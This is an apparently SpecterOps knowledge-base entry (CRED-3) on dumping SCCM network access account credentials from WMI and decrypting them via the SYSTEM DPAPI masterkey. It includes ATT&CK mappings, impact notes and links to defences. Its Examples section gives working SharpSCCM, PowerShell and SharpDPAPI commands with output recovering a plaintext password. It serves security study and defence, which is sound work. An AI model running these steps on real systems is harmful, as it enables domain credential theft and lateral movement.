# CRED-3
## Description
Dump currently deployed credentials via WMI

## MITRE ATT&CK TTPs
- [TA0006](https://attack.mitre.org/tactics/TA0006/) - Credential Access
- [T1555s](https://attack.mitre.org/techniques/T1555/) - Passwords from Password Store

## Requirements
- Local administrative privileges on the SCCM client

## Summary
The [network access account](https://learn.microsoft.com/en-us/mem/configmgr/core/plan-design/hierarchy/accounts#network-access-account) (NAA) is a domain account that can be configured on the site server. Clients use the NAA to access and retrieve software from a distribution point but serves no other purpose on the client. The credentials are retrieved by clients as part of the Computer Policy. Once received by the client, the credentials are stored in the `CCM_NetworkAccessAccount` class in the `root\ccm\policy\Machine\ActualConfig` WMI namespace. This can be verified with the following PowerShell one-liner: `Get-WmiObject -namespace "root\ccm\policy\Machine\ActualConfig" -class "CCM_NetworkAccessAccount"`.

Within this class, there exists two members of interest: `NetworkAccessUsername` and `NetworkAccessPassword`, which contain hexidecimal strings of encrypted data. This data is protected via the Data Protection API (DPAPI) and the SYSTEM DPAPI masterkey. Therefore, we must be elevated on the host in order to retrieve the SYSTEM masterkey which can then be used to decrypt the secrets. This technique applies only to currently-configured NAAs.

This process is automated in [SharpDPAPI](https://github.com/GhostPack/SharpDPAPI?tab=readme-ov-file#sccm) and [SharpSCCM](https://github.com/Mayyhem/SharpSCCM).

A successful decryption result of `00 00 0E 0E 0E 0E...` indicates that the Site Server is configured for NAA but the client is instructed to use its [machine account](https://twitter.com/subat0mik/status/1582387536147582976?s=20).

## Impact

This technique may allow an attacker to retrieve plaintext domain credentials. Even if the NAA is not over-privileged, domain credentials may be useful for attackers where explicit credentials are required, such as proxying tooling into an environment over command and control (C2). If the NAA is overprivileged, this technique enables lateral movement to other clients and/or sensitive systems.

We (SpecterOps) commonly see accounts that are members of the `SCCM Administrators` and `Domain Admins` groups configured as the NAA.

## Defensive IDs
- [PREVENT-3: Harden or Disable Network Access Account](../../../defense-techniques/PREVENT/PREVENT-3/prevent-3_description.md)
- [PREVENT-4: Configure Enhanced HTTP](../../../defense-techniques/PREVENT/PREVENT-4/prevent-4_description.md)
- [PREVENT-10: Principle of Least Privilege](../../../defense-techniques/PREVENT/PREVENT-10/prevent-10_description.md)

## Examples

### SharpSCCM

```
PS C:\tools\SharpSCCM.exe local secrets -m wmi

[+] Connecting to \\127.0.0.1\root\ccm\policy\Machine\ActualConfig

[+] Retrieving network access account blobs via WMI
[+] Retrieving task sequence blobs via WMI
[+] Retrieving collection variable blobs via WMI

[+] Modifying permissions on registry key: SECURITY\Policy\Secrets\DPAPI_SYSTEM\CurrVal\
[+] Modifying permissions on registry key: SECURITY\Policy\PolEKList
[+] Reverting permissions on registry key: SECURITY\Policy\Secrets\DPAPI_SYSTEM\CurrVal\
[+] Reverting permissions on registry key: SECURITY\Policy\PolEKList

[+] Secret: DPAPI_SYSTEM
    full: <SNIP>
     m/u: <SNIP> / <SNIP>

[+] SYSTEM master key cache:
    {GUID}:SHA1
    {GUID}:SHA1
    {GUID}:SHA1

[+] Decrypting network access account credentials

    NetworkAccessUsername: APERTURE\networkaccess
    NetworkAccessPassword: SuperSecretPassword

[+] No task sequences were found
[+] No collection variables were found

[+] Completed execution in 00:00:02.8605620
```

### Manual

- Use SharpDPAPI to retrieve SYSTEM masterkey
- Use PowerShell to retrieve the encrypted secrets
- Manually parse with PowerShell

```

PS C:\Users\labadmin\Desktop> Get-WmiObject -namespace "root\ccm\policy\Machine\ActualConfig" -class "CCM_NetworkAccessAccount"


__GENUS               : 2
__CLASS               : CCM_NetworkAccessAccount
__SUPERCLASS          : CCM_ComponentClientConfig
__DYNASTY             : CCM_Policy
__RELPATH             : CCM_NetworkAccessAccount.SiteSettingsKey=1
__PROPERTY_COUNT      : 8
__DERIVATION          : {CCM_ComponentClientConfig, CCM_Policy}
__SERVER              : CLIENT-1
__NAMESPACE           : ROOT\ccm\policy\Machine\ActualConfig
__PATH                : \\CLIENT-1\ROOT\ccm\policy\Machine\ActualConfig:CCM_NetworkAccessAccount.SiteSettingsKey=1
ComponentName         :
Enabled               :
NetworkAccessPassword : <PolicySecret Version="1"><![CDATA[0601000001000000D08C9DDF0115D1118C7A00C04FC297EB010000007DCB965EA2D25D458FFA078B7AA1010700000000020000000000106600000001000020000000D8FB66BC9F1E0DCC3
                        3416AF0FE95594657F4EF386169990ADB82AB21F4600359000000000E80000000020000200000008674CA3CCB29140976E02445A46F0CA748EDBAC0D847AABA911444EAAA4571FA30000000AFDABECB9D275177B6631E6EEE7C472A2
                        B007768544A408EC45CE5BA94B5DDD9950A9AF814485026A263255C857F3DAF4000000088A3FE3B78029E43339E767845E0367BA98079E27F808472D29975D5486E7E1F37B70FC85D1830ED9EFDFCF3F2310F451C649CE974638278B
                        60B218E7BAF2DAF]]></PolicySecret>
NetworkAccessUsername : <PolicySecret Version="1"><![CDATA[0601000001000000D08C9DDF0115D1118C7A00C04FC297EB010000007DCB965EA2D25D458FFA078B7AA1010700000000020000000000106600000001000020000000FBE709999A688F8C9
                        345B70C1DED0F3D905A21A11A328B624529B0E5B1DB09EC000000000E80000000020000200000006584737680D1A01EFFD4DA3CA38DDE70669225D7F3E8DF6339855F669BF51AEF30000000C0446CFE6977BA5DD77A0B1342B03FE2B
                        1BFCACABADB2A11B60D8EFFB50689B3629C1A70208E279E50216F7A50C27D95400000008749971D42123C00FF50BED19AEE278ACCB3581F84EA3DD445E4116445FAE507646891E1A17702622CDBF74B03C1F585EC5B4D5838143B8E0
                        AD83A0DB10A841D]]></PolicySecret>
Reserved1             :
Reserved2             :
Reserved3             :
SiteSettingsKey       : 1
PSComputerName        : CLIENT-1



PS C:\Users\labadmin\Desktop> $str = "0601000001000000D08C9DDF0115D1118C7A00C04FC297EB010000007DCB965EA2D25D458FFA078B7AA1010700000000020000000000106600000001000020000000D8FB66BC9F1E0DCC33416AF0FE95594657F4EF386169990ADB82AB21F4600359000000000E80000000020000200000008674CA3CCB29140976E02445A46F0CA748EDBAC0D847AABA911444EAAA4571FA30000000AFDABECB9D275177B6631E6EEE7C472A2B007768544A408EC45CE5BA94B5DDD9950A9AF814485026A263255C857F3DAF4000000088A3FE3B78029E43339E767845E0367BA98079E27F808472D29975D5486E7E1F37B70FC85D1830ED9EFDFCF3F2310F451C649CE974638278B60B218E7BAF2DAF"
PS C:\Users\labadmin\Desktop> $bytes = for($i=0; $i -lt $str.Length; $i++) {[byte]::Parse($str.Substring($i, 2), [System.Globalization.NumberStyles]::HexNumber); $i++}
PS C:\Users\labadmin\Desktop> $b64 = [Convert]::ToBase64String($bytes[4..$bytes.Length])
PS C:\Users\labadmin\Desktop> .\SharpDPAPI.exe blob /target:$b64 /mkfile:masterkeys.txt

[*] Action: Describe DPAPI blob

    guidMasterKey    : {5e96cb7d-d2a2-455d-8ffa-078b7aa10107}
    size             : 262
    flags            : 0x0
    algHash/algCrypt : 32782 (CALG_SHA_512) / 26128 (CALG_AES_256)
    description      :
    dec(blob)        : SuperSecretPassword


SharpDPAPI completed in 00:00:00.0397643
```

## References
- Duane Michael, The Phantom Credentials of SCCM: Why the NAA Won’t Die, https://posts.specterops.io/the-phantom-credentials-of-sccm-why-the-naa-wont-die-332ac7aa1ab9
- Chris Thompson, SharpSCCCM, https://github.com/Mayyhem/SharpSCCM
- Will Schroeder, SharpDPAPI, https://github.com/GhostPack/SharpDPAPI
- Duane Michael, X, https://twitter.com/subat0mik/status/1582387536147582976?s=20
- Benjamin Delpy, X, https://twitter.com/gentilkiwi/status/1392594113745362946